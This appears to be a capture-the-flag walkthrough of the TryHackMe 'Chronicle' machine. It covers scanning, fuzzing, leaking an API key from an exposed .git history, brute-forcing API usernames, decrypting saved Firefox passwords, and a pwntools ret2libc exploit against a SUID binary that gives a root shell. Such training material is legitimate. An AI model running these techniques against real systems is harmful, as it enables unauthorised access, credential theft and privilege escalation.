># TryHackMe Chronicle 

## Tasks
user.txt

root.txt

# User Flag

## nmap scan

```
root@ubuntu:~# nmap -sV -sC -Pn -n -A 10.10.173.255
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 20:57 CET
Nmap scan report for 10.10.173.255
Host is up (0.29s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   187.58 ms 10.6.0.1
2   ... 3
4   325.81 ms 10.10.173.255

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.13 seconds

```
## Ports Discoverd
22, 80,  8081

## Port 80

![1](https://user-images.githubusercontent.com/74853138/128644510-c0bbfcae-2b85-417f-851a-494dd8e010dc.png)

## Fuzzing 
```
root@ubuntu:~/THM/Chronicle# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.173.255/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.173.255/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
old                     [Status: 301, Size: 312, Words: 20, Lines: 10]

```

## /old path
![2](https://user-images.githubusercontent.com/74853138/128646402-5f0f7f72-c0ac-4e14-9744-f093584faa53.png)


## note.txt

![3](https://user-images.githubusercontent.com/74853138/128646439-cdef833b-484b-4c87-8272-1c5c6e8a832e.png)

## Download the .git folder

 ```
root@ubuntu:~/THM/Chronicle# wget --recursive http://10.10.173.255/old/.git --continue
Will not apply HSTS. The HSTS database must be a regular and non-world-writable file..........................................
 ```
## Get all files

```
root@ubuntu:~/THM/Chronicle/10.10.173.255# ls -lsa
total 20
4 drwxr-xr-x 4 root root 4096 Aug  7 13:45 .
4 drwxr-xr-x 4 root root 4096 Aug  8 22:37 ..
4 drwxr-xr-x 2 root root 4096 Aug  7 13:45 icons
4 -rw-r--r-- 1 root root   15 Mar 26 23:58 index.html
4 drwxr-xr-x 5 root root 4096 Aug  7 23:25 old
root@ubuntu:~/THM/Chronicle/10.10.173.255# cd old
root@ubuntu:~/THM/Chronicle/10.10.173.255/old# ls -lsa
total 72
4 drwxr-xr-x 5 root root 4096 Aug  7 23:25  .
4 drwxr-xr-x 4 root root 4096 Aug  7 13:45  ..
4 drwxr-xr-x 8 root root 4096 Aug  7 13:45  .git
4 -rw-r--r-- 1 root root 1129 Aug  7 13:45  index.html
4 -rw-r--r-- 1 root root   15 Mar 26 23:58  index.html.1
4 -rw-r--r-- 1 root root 1129 Aug  7 13:45 'index.html?C=D;O=A'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:46 'index.html?C=D;O=D'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:45 'index.html?C=M;O=A'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:46 'index.html?C=M;O=D'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:46 'index.html?C=N;O=A'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:45 'index.html?C=N;O=D'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:45 'index.html?C=S;O=A'
4 -rw-r--r-- 1 root root 1129 Aug  7 13:46 'index.html?C=S;O=D'
4 -rw-r--r-- 1 root root   76 Mar 26 23:27  note.txt
4 drwxr-xr-x 2 root root 4096 Aug  7 13:45  templates
root@ubuntu:~/THM/Chronicle/10.10.173.255/old# 


```
## Git enumeration
Running 
``` 
git log -p 
```
in the directory in which .git was downloaded.

```
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

diff --git a/app.py b/app.py
index 8c729fd..cbf47f5 100644
--- a/app.py
+++ b/app.py
@@ -22,11 +22,11 @@ def info(uname):
     print("OK")
     data=request.get_json(force=True)
     print(data)
-    if(data['key']=='abcd'):
+    if(data['key']=='7454[HIDDEN]0dbc7ef'):
         if(uname=="admin"):
-            return '{"username":"admin","password":"password"}'
+            return '{"username":"admin","password":"password"}'     #Default Change them as required
         elif(uname=="someone"):
-            return '{"username":"someone","password":"someword"}'
+            return '{"username":"someone","password":"someword"}'   #Some other user
         else:
             return 'Invalid Username'
     else:
diff --git a/static/css/boot.css b/static/css/boot.css
new file mode 100644
index 0000000..86c5733
--- /dev/null
+++ b/static/css/boot.css
@@ -0,0 +1,803 @@
+/*Google Fonts*/
+@import url('https://fonts.googleapis.com/css?family=Montserrat:500,600,700');
+@import url('https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600,700');
+@import url("https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css");

```
Moving to the other website under 8081 port, there is a login page, and the LOGIN button and register does not seems to be working.
Forgot password works.

we will do a simple reqeust with NULL key, and random username with POST parametre, its show invalid API key

![6](https://user-images.githubusercontent.com/74853138/128646906-b74243dd-e384-46bf-9921-e84c94e875e8.png)


Now let's try our Key found in this command

```
git log -p
``` 
it's showing Invalid user
![7](https://user-images.githubusercontent.com/74853138/128646999-cde385f3-62be-49e6-9309-45af452129e0.png)

so let's try FUZZing the right user

```
root@ubuntu:~/THM/Chronicle# ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c2[hidden]]c0dbc7ef"}' -u http://10.10.173.255:8081/api/FUZZ -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.173.255:8081/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
 :: Data             : {"key":"7454c[Hidden]]0dbc7ef"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 2
________________________________________________

tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

So we found the right user;
let's do request whith what we have

![8](https://user-images.githubusercontent.com/74853138/128647068-2a46a81c-f550-4402-b55b-190a935251b1.png)


and Voila !!! we have username and password !!

## Port 22 SSH
let's try ssh with our creds.

```
root@ubuntu:~/THM/Chronicle# ssh tommy@10.10.173.255
The authenticity of host '10.10.173.255 (10.10.173.255)' can't be established.
ECDSA key fingerprint is SHA256:t0/3cHdK4vYAwCE2QefO+zIgTg0DipgMcPQLhnjgwhA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.173.255' (ECDSA) to the list of known hosts.
tommy@10.10.173.255's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  8 22:08:37 UTC 2021

  System load:  0.0               Processes:           98
  Usage of /:   60.5% of 8.79GB   Users logged in:     0
  Memory usage: 42%               IP address for eth0: 10.10.173.255
  Swap usage:   0%


73 packages can be updated.
1 update is a security update.


*** System restart required ***
Last login: Fri Apr 16 14:05:02 2021 from 192.168.29.217
tommy@incognito:~$ ls -lsa
total 44
4 drwxr-xr-x 7 tommy tommyV 4096 Jun 11 06:22 .
4 drwxr-xr-x 4 root  root   4096 Apr  3 20:27 ..
0 lrwxrwxrwx 1 root  root      9 Apr  3 20:45 .bash_history -> /dev/null
4 -rw-r--r-- 1 tommy tommyV  220 Apr  4  2018 .bash_logout
4 -rw-r--r-- 1 tommy tommyV 3771 Apr  4  2018 .bashrc
4 drwx------ 2 tommy tommyV 4096 Apr  3 21:07 .cache
4 drwxr-x--- 3 tommy tommyV 4096 Apr  3 21:41 .config
4 drwx------ 4 tommy tommyV 4096 Apr  3 21:41 .gnupg
4 drwxr-xr-x 3 tommy tommyV 4096 Apr  3 21:40 .local
4 -rw-r--r-- 1 tommy tommyV  807 Apr  4  2018 .profile
4 -rw-r--r-- 1 tommy tommyV   33 Apr  3 20:53 user.txt
4 drwxr-xr-x 5 tommy tommyV 4096 Apr  3 20:21 web
tommy@incognito:~$ cat user.txt
7ba840[HIDDEN USER FLAG]b222808ad
tommy@incognito:~$ 


```

Got our first Flag.

Looking fot intersting things

```
tommy@incognito:~$ cd /home
tommy@incognito:/home$ ls -lsa
total 16
4 drwxr-xr-x  4 root  root   4096 Apr  3 20:27 .
4 drwxr-xr-x 26 root  root   4096 Jun 11 06:18 ..
4 drwxr-xr-x  8 carlJ carlJ  4096 Jun 11 06:22 carlJ
4 drwxr-xr-x  7 tommy tommyV 4096 Jun 11 06:22 tommyV
tommy@incognito:/home$ 

```
there is another user carlJ

let's try to move into this user


```
tommy@incognito:/home$ cd carlJ/
tommy@incognito:/home/carlJ$ ls -lsa
total 44
4 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11 06:22 .
4 drwxr-xr-x 4 root  root  4096 Apr  3 20:27 ..
0 lrwxrwxrwx 1 root  root     9 Apr  3 13:44 .bash_history -> /dev/null
4 -rw-r--r-- 1 carlJ carlJ  220 Apr  4  2018 .bash_logout
4 -rw-r--r-- 1 carlJ carlJ 3772 Mar 26 23:32 .bashrc
4 drwx------ 4 carlJ carlJ 4096 Apr  3 20:24 .cache
4 drwxr-x--- 3 carlJ carlJ 4096 Apr  3 21:44 .config
4 drwx------ 3 carlJ carlJ 4096 Apr  3 21:44 .gnupg
4 drwxrwxr-x 3 carlJ carlJ 4096 Apr 16 14:08 .local
4 drwx------ 2 carlJ carlJ 4096 Apr 16 16:02 mailing
4 drwxr-xr-x 5 carlJ carlJ 4096 Mar 28 17:29 .mozilla
4 -rw-r--r-- 1 carlJ carlJ  808 Mar 26 23:32 .profile
tommy@incognito:/home/carlJ$ 


```
there is unusual directory .mozilla inside his home directory

we will use the Firefox Decrypt 

it's showing 2 profiles

the second reqeust a password

let's try various common password,
the correct os password1


```
root@ubuntu:~/THM/Chronicle/firefox_decrypt# python3 firefox_decrypt.py /root/THM/Chronicle/carlJ/firefox/
Select the Mozilla profile you wish to decrypt
1 -> 45ir4czt.default
2 -> 0ryxwn4c.default-release
2

Master Password for profile /root/THM/Chronicle/carlJ/firefox/0ryxwn4c.default-release: 

```

we got new creds for carlJ user

Website:   https://incognito.com

Username: 'dev'

Password: 'hidden'

let's try ssh with the new creds

```
root@ubuntu:~/THM/Chronicle/firefox_decrypt# ssh carlJ@10.10.173.255
carlJ@10.10.173.255's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug  8 22:20:23 UTC 2021

  System load:  0.0               Processes:           103
  Usage of /:   60.8% of 8.79GB   Users logged in:     1
  Memory usage: 43%               IP address for eth0: 10.10.173.255
  Swap usage:   0%


73 packages can be updated.
1 update is a security update.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Sat Apr  3 20:24:03 2021 from 192.168.29.217
carlJ@incognito:~$ 

```




# Privilege Escalation



```
carlJ@incognito:~$ ls -lsa
total 44
4 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11 06:22 .
4 drwxr-xr-x 4 root  root  4096 Apr  3 20:27 ..
0 lrwxrwxrwx 1 root  root     9 Apr  3 13:44 .bash_history -> /dev/null
4 -rw-r--r-- 1 carlJ carlJ  220 Apr  4  2018 .bash_logout
4 -rw-r--r-- 1 carlJ carlJ 3772 Mar 26 23:32 .bashrc
4 drwx------ 4 carlJ carlJ 4096 Apr  3 20:24 .cache
4 drwxr-x--- 3 carlJ carlJ 4096 Apr  3 21:44 .config
4 drwx------ 3 carlJ carlJ 4096 Apr  3 21:44 .gnupg
4 drwxrwxr-x 3 carlJ carlJ 4096 Apr 16 14:08 .local
4 drwx------ 2 carlJ carlJ 4096 Apr 16 16:02 mailing
4 drwxr-xr-x 5 carlJ carlJ 4096 Mar 28 17:29 .mozilla
4 -rw-r--r-- 1 carlJ carlJ  808 Mar 26 23:32 .profile
carlJ@incognito:~$ cd mailing/
carlJ@incognito:~/mailing$ ls -lsa
total 20
 4 drwx------ 2 carlJ carlJ 4096 Apr 16 16:02 .
 4 drwxr-xr-x 8 carlJ carlJ 4096 Jun 11 06:22 ..
12 -rwsrwxr-x 1 root  root  8544 Apr  3 13:29 smail
carlJ@incognito:~/mailing$ ./smail
What do you wanna do
1-Send Message
2-Change your Signature

```

This binary is vulnerable to ret2libc buffer overflow

by using this python code we will got root 

```
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
# root flag

```
carlJ@incognito:~/mailing$ python3 overflow.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.4.0)
[+] Starting local process './smail': pid 15073
[*] Switching to interactive mode
Changed
$ id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
$ cd /root
$ ls
root.txt
$ cat root.txt
f2197[hidden]]84143ab2
$  

```
# Thanks
